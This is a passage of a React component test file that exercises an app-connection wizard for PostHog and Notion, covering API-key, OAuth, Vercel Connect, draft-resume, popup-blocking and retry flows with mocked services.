    expect(container.textContent).not.toContain("Vercel Connect");

    const keyInput = container.querySelector<HTMLInputElement>('input[type="password"]');
    const advanced = buttonByText("Advanced");
    expect(keyInput).toBeTruthy();
    expect(container.querySelector<HTMLInputElement>('input[placeholder="Optional numeric project ID"]')).toBeNull();
    expect(container.querySelector('[role="switch"]')).toBeNull();
    expect(advanced?.getAttribute("aria-expanded")).toBe("false");
    expect(container.textContent).not.toContain("Pin to project ID");
    expect(container.textContent).not.toContain("Feature groups");
    expect(container.textContent).not.toContain("Individual tools");
    expect(container.textContent).not.toContain("Tool response mode");

    await act(async () => {
      advanced?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(advanced?.getAttribute("aria-expanded")).toBe("true");
    expect(container.textContent).toContain("Pin to project ID");
    expect(container.querySelector<HTMLInputElement>('input[placeholder="Optional numeric project ID"]')).toBeTruthy();
    expect(container.querySelector('[role="switch"]')?.getAttribute("aria-checked")).toBe("false");
    expect(container.textContent).toContain("Feature groups");
    expect(container.textContent).toContain("Individual tools");
    expect(container.textContent).not.toContain("Tool response mode");

    await act(async () => {
      setInputValue(keyInput!, "phx_test-key");
    });
    await flushReact();
    const submit = buttonByText("Connect");
    expect(submit).toBeTruthy();
    expect(submit?.disabled).toBe(false);
    await act(async () => {
      submit?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledWith("company-1", {
      galleryKey: "posthog",
      connectionMethodKey: "mcp-api-key",
      name: "PostHog for the company",
      credentialSource: "paperclip_vault",
      credentialValues: { "credentials.authorization": "phx_test-key" },
      configValues: {
        readOnly: false,
        mode: "tools",
      },
      applicationId: undefined,
      // Flexible methods default to a company identity, represented by omitting
      // the optional personal grantKind from the request.
    });
  });

  it("hands reviewed PostHog credentials to Vercel and submits only the connector reference", async () => {
    mockParams.appKey = "posthog";
    listGalleryMock.mockResolvedValueOnce({
      apps: [POSTHOG],
      credentialSources: {
        vercelConnect: {
          available: true,
          enabled: true,
          authentication: "access_token",
          manageUrl: "https://vercel.com/connect",
          reason: null,
        },
      },
    });
    await render(undefined, false, <AppsConnect credentialSource="vercel_connect" />);
    await passAccessStep();
    await act(async () => {
      radioContaining("Use a personal API key")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(container.textContent).toContain("Create or attach the connector in Vercel");
    expect(container.querySelector('a[href="https://vercel.com/connect"]')).toBeTruthy();
    expect(container.querySelector<HTMLInputElement>('input[type="password"]')).toBeNull();
    const connectorInput = container.querySelector<HTMLInputElement>('#vercel-connect-connector');
    expect(connectorInput).toBeTruthy();
    await act(async () => {
      setInputValue(connectorInput!, "posthog/paperclip");
    });
    await flushReact();
    const vercelSubmit = buttonByText("Validate and connect");
    expect(vercelSubmit).toBeTruthy();
    expect(vercelSubmit?.disabled).toBe(false);
    await act(async () => {
      vercelSubmit?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledWith("company-1", {
      galleryKey: "posthog",
      connectionMethodKey: "mcp-api-key",
      name: "PostHog for the company",
      credentialSource: "vercel_connect",
      vercelConnect: { connector: "posthog/paperclip" },
      configValues: { readOnly: false, mode: "tools" },
      applicationId: undefined,
    });
    expect(JSON.stringify(connectAppMock.mock.calls[0])).not.toContain("credentialValues");
  });

  it("folds optional customer-owned OAuth details under Advanced", async () => {
    mockParams.appKey = "posthog";
    listGalleryMock.mockResolvedValueOnce({ apps: [POSTHOG] });
    await render();
    await passAccessStep();

    await act(async () => {
      radioContaining("Sign in with PostHog")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    const advanced = buttonByText("Advanced");
    expect(advanced?.getAttribute("aria-expanded")).toBe("false");
    expect(container.textContent).not.toContain("Use your own OAuth app");
    expect(container.querySelector("#curated-oauth-client-id")).toBeNull();
    expect(buttonByText("Continue to sign in")?.disabled).toBe(false);

    await act(async () => {
      advanced?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(container.textContent).toContain("Use your own OAuth app");
    expect(container.querySelector("#curated-oauth-client-id")).toBeTruthy();
    expect(container.textContent).toContain("Paperclip callback URL");
  });

  it("shows unavailable Vercel configuration only inside the isolated Vercel entry point", async () => {
    listGalleryMock.mockResolvedValueOnce({
      apps: [POSTHOG],
      credentialSources: {
        vercelConnect: {
          available: false,
          enabled: true,
          authentication: null,
          manageUrl: "https://vercel.com/connect",
          reason: "Vercel Connect needs workload OIDC or an instance access token.",
        },
      },
    });
    await render(undefined, false, <AppsConnect credentialSource="vercel_connect" />);

    expect(container.textContent).toContain("Connect through Vercel");
    expect(container.textContent).toContain("Vercel Connect needs workload OIDC or an instance access token.");
    expect(buttonContaining("PostHog")?.disabled).toBe(true);
    expect(container.textContent).not.toContain("Where are credentials managed?");
  });

  it("renders the same PostHog method choices in page and task-dialog hosts", async () => {
    const methodState = () => ({
      oauth: buttonByText("Sign in with PostHog")?.getAttribute("aria-pressed"),
      apiKey: buttonByText("Use a personal API key")?.getAttribute("aria-pressed"),
      connectDisabled: buttonByText("Connect")?.disabled,
    });

    mockParams.appKey = "posthog";
    listGalleryMock.mockResolvedValue({ apps: [POSTHOG] });
    const pageRoot = await render();
    await passAccessStep();
    const pageMethods = methodState();
    await act(async () => pageRoot.unmount());
    container.innerHTML = "";

    mockParams.appKey = undefined;
    const dialogRoot = await render(undefined, false, (
      <ConnectionSetupFlow
        host="dialog"
        serviceSlug="posthog"
        requestedAgentId="agent-1"
      />
    ));
    expect(container.textContent).toContain("This task grants access only to Ada");
    const continueButton = Array.from(container.querySelectorAll("button")).find(
      (button) => button.textContent?.trim() === "Save and continue",
    );
    expect(continueButton).toBeTruthy();
    expect(continueButton?.disabled).toBe(false);
    await act(async () => {
      continueButton?.click();
    });
    await flushReact();

    expect(methodState()).toEqual(pageMethods);
    await act(async () => dialogRoot.unmount());
  });

  it("reserves the task-dialog OAuth popup before awaiting connection setup and assigns only the validated URL", async () => {
    listGalleryMock.mockResolvedValue({ apps: [NOTION] });
    let resolveConnect!: (value: unknown) => void;
    connectAppMock.mockReturnValue(new Promise((resolve) => { resolveConnect = resolve; }));
    const assign = vi.fn();
    const focus = vi.fn();
    const openSpy = vi.spyOn(window, "open").mockReturnValue({
      closed: false,
      location: { assign },
      focus,
    } as unknown as Window);

    const dialogRoot = await render(undefined, false, (
      <ConnectionSetupFlow
        host="dialog"
        serviceSlug="notion"
        requestedAgentId="agent-1"
        interactionId="interaction-1"
      />
    ));
    await passAccessStep();
    await submitCuratedOAuthSetup();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    expect(openSpy).toHaveBeenCalledWith(
      "about:blank",
      "paperclip-connection-oauth",
      "popup,width=720,height=760,resizable=yes,scrollbars=yes",
    );
    expect(openSpy.mock.invocationCallOrder[0]).toBeLessThan(connectAppMock.mock.invocationCallOrder[0]!);
    expect(assign).not.toHaveBeenCalled();

    resolveConnect({
      connectionId: "conn-notion",
      application: { id: "app-notion", name: "Notion" },
      connection: { id: "conn-notion", credentialPolicy: "per_user" },
      actions: { readOnly: [], canMakeChanges: [] },
      catalog: [],
      suggestedDefaults: {},
      auth: { kind: "oauth", startUrl: "https://untrusted-return-value.test/ignored" },
    });
    await flushReact();
    await flushReact();

    expect(startOAuthMock).toHaveBeenCalledWith("conn-notion", {
      asCurrentUser: true,
      interactionId: "interaction-1",
    });
    expect(assign).toHaveBeenCalledWith("https://mcp.notion.com/authorize?state=resumed");
    expect(assign).not.toHaveBeenCalledWith("https://untrusted-return-value.test/ignored");
    expect(focus).toHaveBeenCalled();

    openSpy.mockRestore();
    await act(async () => dialogRoot.unmount());
  });

  it("keeps the task dialog recoverable when the browser blocks its reserved OAuth popup", async () => {
    listGalleryMock.mockResolvedValue({ apps: [NOTION] });
    connectAppMock.mockResolvedValue({
      connectionId: "conn-notion",
      application: { id: "app-notion", name: "Notion" },
      connection: { id: "conn-notion", credentialPolicy: "per_user" },
      actions: { readOnly: [], canMakeChanges: [] },
      catalog: [],
      suggestedDefaults: {},
      auth: { kind: "oauth", startUrl: null },
    });
    const openSpy = vi.spyOn(window, "open").mockReturnValue(null);
    const onPhaseChange = vi.fn();

    const dialogRoot = await render(undefined, false, (
      <ConnectionSetupFlow
        host="dialog"
        serviceSlug="notion"
        requestedAgentId="agent-1"
        interactionId="interaction-1"
        onPhaseChange={onPhaseChange}
      />
    ));
    await passAccessStep();
    await submitCuratedOAuthSetup();
    await flushReact();
    await flushReact();

    expect(container.textContent).toContain("Allow popups for this site and try again");
    expect(container.textContent).toContain("Try again");
    expect(onPhaseChange).toHaveBeenCalledWith("needs_retry");

    openSpy.mockRestore();
    await act(async () => dialogRoot.unmount());
  });

  it("chooses identity before the Notion source deep link opens provider sign-in", async () => {
    mockSearch.value = "source=notion";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    connectAppMock.mockResolvedValueOnce({
      connectionId: "conn-notion",
      application: { id: "app-notion", name: "Notion" },
      connection: { id: "conn-notion" },
      actions: { readOnly: [], canMakeChanges: [] },
      catalog: [],
      suggestedDefaults: {},
      auth: { kind: "oauth", startUrl: "https://mcp.notion.com/authorize?state=opaque" },
    });

    await render();

    expect(connectAppMock).not.toHaveBeenCalled();
    expect(navigateTopLevelMock).not.toHaveBeenCalled();
    expect(container.textContent).toContain("Which humans can use this credential?");
    expect(container.textContent).not.toContain("Choose access before sign-in");
    const identityRadios = Array.from(document.body.querySelectorAll('[role="radio"]'));
    expect(identityRadios.find((radio) => radio.textContent?.includes("Any human in the company"))?.getAttribute("aria-checked"))
      .toBe("true");

    await passAccessStep();
    await submitCuratedOAuthSetup();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    expect(connectAppMock).toHaveBeenCalledWith("company-1", {
      galleryKey: "notion",
      connectionMethodKey: "mcp-oauth",
      name: "Notion for the company",
      credentialSource: "paperclip_vault",
      credentialValues: {},
      configValues: undefined,
      applicationId: undefined,
    });
    expect(navigateTopLevelMock).toHaveBeenCalledWith(
      "https://mcp.notion.com/authorize?state=opaque",
    );
  });

  it("shows an in-flight state while Paperclip prepares Notion sign-in", async () => {
    mockSearch.value = "source=notion";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    connectAppMock.mockReturnValueOnce(new Promise(() => {}));

    await render();
    await passAccessStep();
    await submitCuratedOAuthSetup();

    expect(container.textContent).toContain("Connect Notion");
    expect(container.textContent).toContain("Preparing secure sign-in");
    expect(container.textContent).toContain("Preparing…");
    expect(connectAppMock).toHaveBeenCalledTimes(1);
  });

  it("backs from the sign-in checkpoint to Access without exiting the wizard", async () => {
    mockSearch.value = "source=notion";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    connectAppMock.mockReturnValueOnce(new Promise(() => {}));

    await render();
    await passAccessStep();
    await submitCuratedOAuthSetup();

    await act(async () => {
      buttonByText("Back")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(container.textContent).toContain("Which humans can use this credential?");
    expect(mockNavigate).toHaveBeenCalledWith("/apps/connect?source=notion&stage=access");
    expect(mockNavigate).not.toHaveBeenCalledWith("/apps");
  });

  it("resumes an existing Notion OAuth connection instead of creating another draft", async () => {
    const interactionId = "11111111-1111-4111-8111-111111111111";
    mockSearch.value = `source=notion&intent=${interactionId}`;
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    listApplicationsMock.mockResolvedValueOnce({
      applications: [{
        id: "app-notion",
        status: "draft",
        metadata: { sourceTemplateKey: "notion" },
      }],
    });
    listConnectionsMock.mockResolvedValueOnce({
      connections: [{
        id: "conn-existing",
        applicationId: "app-notion",
        authKind: "oauth",
        credentialPolicy: "per_user",
        status: "draft",
        config: { sourceTemplateKey: "notion" },
        transportConfig: {},
      }],
    });
    startOAuthMock.mockResolvedValueOnce({
      connectionId: "conn-existing",
      provider: "notion",
      authorizationUrl: "https://mcp.notion.com/authorize?state=existing",
      expiresAt: "2099-01-01T00:00:00.000Z",
    });

    await render();
    expect(container.textContent).not.toContain("Reconnect keeps this identity type");
    expect(container.textContent).toContain("Existing agent access stays the same");
    expect(startOAuthMock).not.toHaveBeenCalled();
    await passAccessStep();
    await submitCuratedOAuthSetup();

    expect(connectAppMock).not.toHaveBeenCalled();
    expect(startOAuthMock).toHaveBeenCalledWith("conn-existing", {
      asCurrentUser: true,
      interactionId,
    });
    expect(navigateTopLevelMock).toHaveBeenCalledWith(
      "https://mcp.notion.com/authorize?state=existing",
    );
  });

  it("resumes the exact draft selected by Finish setup", async () => {
    mockSearch.value = "source=notion&resume=22222222-2222-4222-8222-222222222222";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    listApplicationsMock.mockResolvedValueOnce({
      applications: [{
        id: "app-notion",
        status: "active",
        metadata: { sourceTemplateKey: "notion" },
      }],
    });
    listConnectionsMock.mockResolvedValueOnce({
      connections: [
        {
          id: "11111111-1111-4111-8111-111111111111",
          applicationId: "app-notion",
          authKind: "oauth",
          credentialPolicy: "shared",
          status: "draft",
          config: { sourceTemplateKey: "notion" },
          transportConfig: {},
        },
        {
          id: "22222222-2222-4222-8222-222222222222",
          applicationId: "app-notion",
          authKind: "oauth",
          credentialPolicy: "per_user",
          status: "draft",
          config: { sourceTemplateKey: "notion" },
          transportConfig: {},
        },
      ],
    });

    await render();
    await vi.waitFor(() => {
      expect(container.textContent).toContain("Finish connecting Notion");
    });
    expect(container.textContent).toContain("identity and agent access will stay the same");
    expect(container.textContent).not.toContain("Choose access before sign-in");
    expect(buttonByText("Continue to sign in")).toBeUndefined();
    await act(async () => {
      buttonByText("Finish with Notion")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).not.toHaveBeenCalled();
    expect(startOAuthMock).toHaveBeenCalledWith(
      "22222222-2222-4222-8222-222222222222",
      { asCurrentUser: true },
    );
    expect(navigateTopLevelMock).toHaveBeenCalledWith(
      "https://mcp.notion.com/authorize?state=resumed",
    );
  });

  it("returns a declined OAuth draft to the same one-action resume checkpoint", async () => {
    mockSearch.value = "source=notion&resume=22222222-2222-4222-8222-222222222222&oauth=denied&code=oauth_authorization_denied";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    listApplicationsMock.mockResolvedValueOnce({
      applications: [{
        id: "app-notion",
        status: "draft",
        metadata: { sourceTemplateKey: "notion" },
      }],
    });
    listConnectionsMock.mockResolvedValueOnce({
      connections: [{
        id: "22222222-2222-4222-8222-222222222222",
        applicationId: "app-notion",
        authKind: "oauth",
        credentialPolicy: "shared",
        status: "draft",
        config: { sourceTemplateKey: "notion", connectionMethodKey: "mcp-oauth" },
        transportConfig: {},
      }],
    });

    await render();
    await flushReact();
    expect(container.textContent).toContain("Notion couldn’t connect");
    expect(container.textContent).toContain("Your saved connection was not changed");
    expect(buttonByText("Try again")).toBeTruthy();

    await act(async () => {
      buttonByText("Try again")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    expect(startOAuthMock).toHaveBeenCalledWith(
      "22222222-2222-4222-8222-222222222222",
      { asCurrentUser: false },
    );
  });

  it.each([
    ["personal", "per_user", true],
    ["organization", "shared", false],
  ] as const)("preserves an active %s identity when reconnecting Notion", async (
    _label,
    credentialPolicy,
    asCurrentUser,
  ) => {
    mockSearch.value = "source=notion";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    listApplicationsMock.mockResolvedValueOnce({
      applications: [{
        id: "app-notion",
        status: "active",
        metadata: { sourceTemplateKey: "notion" },
      }],
    });
    listConnectionsMock.mockResolvedValueOnce({
      connections: [{
        id: "conn-existing",
        applicationId: "app-notion",
        authKind: "oauth",
        credentialPolicy,
        status: "active",
        config: { sourceTemplateKey: "notion" },
        transportConfig: {},
      }],
    });
    startOAuthMock.mockResolvedValueOnce({
      connectionId: "conn-existing",
      provider: "notion",
      authorizationUrl: "https://mcp.notion.com/authorize?state=existing",
      expiresAt: "2099-01-01T00:00:00.000Z",
    });

    await render();
    expect(container.textContent).toContain(
      credentialPolicy === "per_user" ? "Just me" : "Any human in the company",
    );
    expect(container.textContent).toContain("Existing agent access stays the same");
    await passAccessStep();
    await submitCuratedOAuthSetup();

    expect(startOAuthMock).toHaveBeenCalledWith("conn-existing", {
      asCurrentUser,
    });
  });

  it("revives an archived Notion connection without reopening its organization identity choice", async () => {
    mockSearch.value = "source=notion&applicationId=app-notion&new=1&reconnect=conn-archived&identity=organization";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    listApplicationsMock.mockResolvedValueOnce({
      applications: [{
        id: "app-notion",
        status: "archived",
        metadata: { sourceTemplateKey: "notion" },
      }],
    });
    listConnectionsMock.mockResolvedValueOnce({
      connections: [{
        id: "conn-archived",
        applicationId: "app-notion",
        authKind: "oauth",
        credentialPolicy: "shared",
        status: "archived",
        config: { sourceTemplateKey: "notion" },
        transportConfig: {},
      }],
    });
    connectAppMock.mockResolvedValueOnce({
      connectionId: "conn-archived",
      application: { id: "app-notion", name: "Notion" },
      connection: {
        id: "conn-archived",
        credentialPolicy: "shared",
        status: "draft",
      },
      actions: { readOnly: [], canMakeChanges: [] },
      catalog: [],
      suggestedDefaults: {},
      auth: { kind: "oauth", startUrl: null },
    });
    startOAuthMock.mockResolvedValueOnce({
      connectionId: "conn-archived",
      provider: "notion",
      authorizationUrl: "https://mcp.notion.com/authorize?state=revived",
      expiresAt: "2099-01-01T00:00:00.000Z",
    });

    await render();
    expect(container.textContent).toContain("Any human in the company");
    await passAccessStep();
    await submitCuratedOAuthSetup();

    expect(connectAppMock).toHaveBeenCalledWith("company-1", expect.objectContaining({
      galleryKey: "notion",
      applicationId: "app-notion",
    }));
    expect(connectAppMock.mock.calls[0]?.[1]).not.toHaveProperty("grantKind");
    expect(startOAuthMock).toHaveBeenCalledWith("conn-archived", {
      asCurrentUser: false,
    });
  });

  it("offers recovery when provider details fail during an exact retained reconnect", async () => {
    mockSearch.value = "source=notion&applicationId=app-notion&new=1&reconnect=conn-archived&identity=organization";
    listGalleryMock.mockRejectedValueOnce(new Error("Gallery unavailable"));
    listApplicationsMock.mockResolvedValueOnce({
      applications: [{
        id: "app-notion",
        status: "archived",
        metadata: { sourceTemplateKey: "notion" },
      }],
    });
    listConnectionsMock.mockResolvedValueOnce({
      connections: [{
        id: "conn-archived",
        applicationId: "app-notion",
        authKind: "oauth",
        credentialPolicy: "shared",
        status: "archived",
        config: { sourceTemplateKey: "notion" },
        transportConfig: {},
      }],
    });

    await render();

    expect(container.textContent).toContain("Couldn’t load connection setup");
    expect(container.textContent).toContain("The retained connection was not changed");
    expect(container.querySelector('[aria-label="Loading retained connection setup"]')).toBeNull();

    await act(async () => {
      buttonByText("Try again")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(listGalleryMock).toHaveBeenCalledTimes(2);
    expect(container.textContent).not.toContain("Couldn’t load connection setup");
  });

  it.each(["connection", "application"] as const)(
    "keeps an exact retained reconnect retryable when the %s lookup fails",
    async (failedLookup) => {
      mockSearch.value = "source=notion&applicationId=app-notion&new=1&reconnect=conn-archived&identity=organization";
      listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
      const applications = {
        applications: [{
          id: "app-notion",
          status: "archived",
          metadata: { sourceTemplateKey: "notion" },
        }],
      };
      const connections = {
        connections: [{
          id: "conn-archived",
          applicationId: "app-notion",
          authKind: "oauth",
          credentialPolicy: "shared",
          status: "archived",
          config: { sourceTemplateKey: "notion" },
          transportConfig: {},
        }],
      };
      if (failedLookup === "connection") {
        listConnectionsMock
          .mockRejectedValueOnce(new Error("Connection lookup unavailable"))
          .mockResolvedValueOnce(connections);
        listApplicationsMock.mockResolvedValue(applications);
      } else {
        listApplicationsMock
          .mockRejectedValueOnce(new Error("Application lookup unavailable"))
          .mockResolvedValueOnce(applications);
        listConnectionsMock.mockResolvedValue(connections);
      }

      await render();

      expect(container.textContent).toContain("Couldn’t load connection setup");
      expect(container.textContent).toContain("The retained connection was not changed");
      expect(container.textContent).not.toContain("This connection can’t be reconnected");

      await act(async () => {
        buttonByText("Try again")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
      });
      await flushReact();
      await flushReact();

      expect(listConnectionsMock).toHaveBeenCalledTimes(2);
      expect(listApplicationsMock).toHaveBeenCalledTimes(2);
      expect(container.textContent).not.toContain("Couldn’t load connection setup");
      expect(container.textContent).toContain("Connect Notion to Paperclip");
    },
  );

  it("creates a fresh Notion OAuth connection when the provider landing requests another", async () => {
    mockSearch.value = "source=notion&applicationId=app-notion&new=1";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    listApplicationsMock.mockResolvedValueOnce({
      applications: [{
        id: "app-notion",
        status: "active",
        metadata: { sourceTemplateKey: "notion" },
      }],
    });
    listConnectionsMock.mockResolvedValueOnce({
      connections: [{
        id: "conn-existing",
        applicationId: "app-notion",
        authKind: "oauth",
        status: "active",
        config: { sourceTemplateKey: "notion" },
        transportConfig: {},
      }, {
        id: "conn-other-draft",
        applicationId: "app-other",
        authKind: "oauth",
        status: "draft",
        config: { sourceTemplateKey: "notion" },
        transportConfig: {},
      }],
    });
    connectAppMock.mockResolvedValueOnce({
      connectionId: "conn-new",
      application: { id: "app-notion", name: "Notion" },
      connection: { id: "conn-new" },
      actions: { readOnly: [], canMakeChanges: [] },
      catalog: [],
      suggestedDefaults: {},
      auth: { kind: "oauth", startUrl: "https://mcp.notion.com/authorize?state=new" },
    });

    await render();
    expect(connectAppMock).not.toHaveBeenCalled();
    await passAccessStep();
    await submitCuratedOAuthSetup();

    expect(startOAuthMock).not.toHaveBeenCalled();
    expect(connectAppMock).toHaveBeenCalledWith("company-1", {
      galleryKey: "notion",
      connectionMethodKey: "mcp-oauth",
      name: "Notion for the company",
      credentialSource: "paperclip_vault",
      credentialValues: {},
      configValues: undefined,
      applicationId: "app-notion",
    });
    expect(navigateTopLevelMock).toHaveBeenCalledWith(
      "https://mcp.notion.com/authorize?state=new",
    );
  });

  it("waits for fresh connection data before creating a Notion OAuth draft", async () => {
    mockSearch.value = "source=notion";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    const queryClient = new QueryClient({ defaultOptions: { queries: { retry: false } } });
    queryClient.setQueryData(queryKeys.tools.applications("company-1"), { applications: [] });
    queryClient.setQueryData(queryKeys.tools.connections("company-1"), { connections: [] });

    let resolveApplications!: (value: unknown) => void;
    let resolveConnections!: (value: unknown) => void;
    listApplicationsMock.mockReturnValueOnce(new Promise((resolve) => {
      resolveApplications = resolve;
    }));
    listConnectionsMock.mockReturnValueOnce(new Promise((resolve) => {
      resolveConnections = resolve;
    }));

    await render(queryClient);

    expect(connectAppMock).not.toHaveBeenCalled();
    expect(startOAuthMock).not.toHaveBeenCalled();

    resolveApplications({
      applications: [{
        id: "app-notion",
        status: "draft",
        metadata: { sourceTemplateKey: "notion" },
      }],
    });
    resolveConnections({
      connections: [{
        id: "conn-refreshed",
        applicationId: "app-notion",
        authKind: "oauth",
        credentialPolicy: "per_user",
        status: "draft",
        config: { sourceTemplateKey: "notion" },
        transportConfig: {},
      }],
    });
    await flushReact();
    await flushReact();

    expect(connectAppMock).not.toHaveBeenCalled();
    expect(startOAuthMock).not.toHaveBeenCalled();
    expect(container.textContent).not.toContain("Reconnect keeps this identity type");
    expect(container.textContent).toContain("Existing agent access stays the same");
    await passAccessStep();
    await submitCuratedOAuthSetup();
    expect(startOAuthMock).toHaveBeenCalledWith("conn-refreshed", {
      asCurrentUser: true,
    });
  });

  it("resumes Notion OAuth after a failed connection lookup is retried", async () => {
    mockSearch.value = "source=notion";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    listApplicationsMock
      .mockRejectedValueOnce(new Error("Lookup unavailable"))
      .mockResolvedValueOnce({
        applications: [{
          id: "app-notion",
          status: "draft",
          metadata: { sourceTemplateKey: "notion" },
        }],
      });
    listConnectionsMock
      .mockResolvedValueOnce({ connections: [] })
      .mockResolvedValueOnce({
        connections: [{
          id: "conn-after-retry",
          applicationId: "app-notion",
          authKind: "oauth",
          credentialPolicy: "per_user",
          status: "draft",
          config: { sourceTemplateKey: "notion" },
          transportConfig: {},
        }],
      });

    await render();

    expect(container.textContent).toContain("couldn’t check for an existing connection");
    await act(async () => {
      buttonByText("Try again")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await flushReact();

    expect(connectAppMock).not.toHaveBeenCalled();
    expect(startOAuthMock).not.toHaveBeenCalled();
    expect(container.textContent).not.toContain("Reconnect keeps this identity type");
    expect(container.textContent).toContain("Existing agent access stays the same");
    await passAccessStep();
    await submitCuratedOAuthSetup();
    expect(startOAuthMock).toHaveBeenCalledWith("conn-after-retry", {
      asCurrentUser: true,
    });
    expect(navigateTopLevelMock).toHaveBeenCalledWith(
      "https://mcp.notion.com/authorize?state=resumed",
    );
  });

  it("restores the Notion lookup error when retrying still fails", async () => {
    mockSearch.value = "source=notion";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    listApplicationsMock.mockRejectedValue(new Error("Lookup unavailable"));

    await render();
    await passAccessStep();

    await act(async () => {
      buttonByText("Try again")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await flushReact();

    expect(container.textContent).toContain("couldn’t check for an existing connection");
    expect(buttonByText("Try again")).toBeTruthy();
    expect(connectAppMock).not.toHaveBeenCalled();
    expect(startOAuthMock).not.toHaveBeenCalled();
  });

  it("retries OAuth on the prepared connection without creating another draft", async () => {
    mockSearch.value = "source=notion";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    connectAppMock.mockResolvedValueOnce({
      connectionId: "conn-prepared",
      application: { id: "app-notion", name: "Notion" },
      connection: { id: "conn-prepared", credentialPolicy: "per_user", status: "draft" },
      actions: { readOnly: [], canMakeChanges: [] },
      catalog: [],
      suggestedDefaults: {},
      auth: { kind: "oauth", startUrl: null },
    });
    startOAuthMock
      .mockRejectedValueOnce(new Error("Provider unavailable"))
      .mockResolvedValueOnce({
        connectionId: "conn-prepared",
        provider: "notion",
        authorizationUrl: "https://mcp.notion.com/authorize?state=retry",
        expiresAt: "2099-01-01T00:00:00.000Z",
      });

    await render();
    await passAccessStep();
    await submitCuratedOAuthSetup();

    expect(container.textContent).toContain("Provider unavailable");
    await act(async () => {
      buttonByText("Try again")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    expect(startOAuthMock).toHaveBeenCalledTimes(2);
    expect(startOAuthMock).toHaveBeenLastCalledWith("conn-prepared", {
      asCurrentUser: true,
    });
    expect(navigateTopLevelMock).toHaveBeenCalledWith(
      "https://mcp.notion.com/authorize?state=retry",
    );
  });

  it("recovers a response-lost Notion draft before retrying creation", async () => {
    mockSearch.value = "source=notion";
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    listApplicationsMock
      .mockResolvedValueOnce({ applications: [] })
      .mockResolvedValueOnce({
        applications: [{
          id: "app-response-lost",
          status: "draft",
          metadata: { sourceTemplateKey: "notion" },
        }],
      });
    listConnectionsMock
      .mockResolvedValueOnce({ connections: [] })
      .mockResolvedValueOnce({
        connections: [{
          id: "conn-response-lost",
          applicationId: "app-response-lost",
          authKind: "oauth",
          credentialPolicy: "per_user",
          status: "draft",
          config: { sourceTemplateKey: "notion" },
          transportConfig: {},
        }],
      });
    connectAppMock.mockRejectedValueOnce(new Error("Response lost"));
    startOAuthMock.mockResolvedValueOnce({
      connectionId: "conn-response-lost",
      provider: "notion",
      authorizationUrl: "https://mcp.notion.com/authorize?state=recovered",
      expiresAt: "2099-01-01T00:00:00.000Z",
    });

    await render();
    await passAccessStep();
    await submitCuratedOAuthSetup();

    expect(container.textContent).toContain("Response lost");
    await act(async () => {
      buttonByText("Try again")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    expect(startOAuthMock).toHaveBeenCalledWith("conn-response-lost", {
      asCurrentUser: true,
    });
    expect(navigateTopLevelMock).toHaveBeenCalledWith(
      "https://mcp.notion.com/authorize?state=recovered",
    );
  });

  it("opens customer-owned OAuth apps instead of blocking them by slug", async () => {
    const slack = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "slack")!;
    mockParams.appKey = "slack";
    listGalleryMock.mockResolvedValueOnce({ apps: [slack] });

    await render();

    expect(connectAppMock).not.toHaveBeenCalled();
    expect(container.textContent).toContain("Which humans can use this credential?");
    expect(mockNavigate).not.toHaveBeenCalledWith("/apps/connect", { replace: true });
  });

  it("routes the enabled Notion gallery tile through the generic source deep link", async () => {
    listGalleryMock.mockResolvedValueOnce({ apps: [NOTION] });
    await render();

    const notionTile = buttonContaining("Notion");
    expect(notionTile?.disabled).toBe(false);
    expect(notionTile?.textContent).toContain("Connect");

    await act(async () => {
      notionTile?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    expect(mockNavigate).toHaveBeenCalledWith("/apps/connect?source=notion");
  });

  it("choosing No and clicking Check link connects with no credentials", async () => {
    await render();
    await gotoLinkFrame(container, "https://www.example.com/actions");

    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    const [, input] = connectAppMock.mock.calls[0];
    expect(input).toMatchObject({
      link: "https://www.example.com/actions",
      name: "example.com/actions for the company",
    });
    expect(input.credentialValues).toBeUndefined();
  });

